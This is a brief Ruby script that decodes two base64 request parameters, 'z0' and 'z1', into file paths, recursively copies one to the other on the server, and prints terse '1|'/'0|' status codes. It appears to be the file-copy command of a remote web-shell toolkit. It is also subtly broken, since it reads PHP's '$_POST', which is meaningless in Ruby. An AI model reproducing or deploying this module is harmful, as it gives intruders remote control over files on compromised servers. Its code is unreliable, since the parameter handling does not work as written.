require 'base64'
require 'fileutils'

def main
  src_path = Base64.decode64($_POST['z0'].to_s)
  dst_path = Base64.decode64($_POST['z1'].to_s)

  unless File.exist?(src_path)
    print "0|Source does not exist."
    return
  end

  if File.exist?(dst_path)
    print "0|Destination already exists."
    return
  end

  begin
    FileUtils.cp_r(src_path, dst_path)
    print "1|"
  rescue => e
    print "0|Error: #{e.message}"
  end
end

main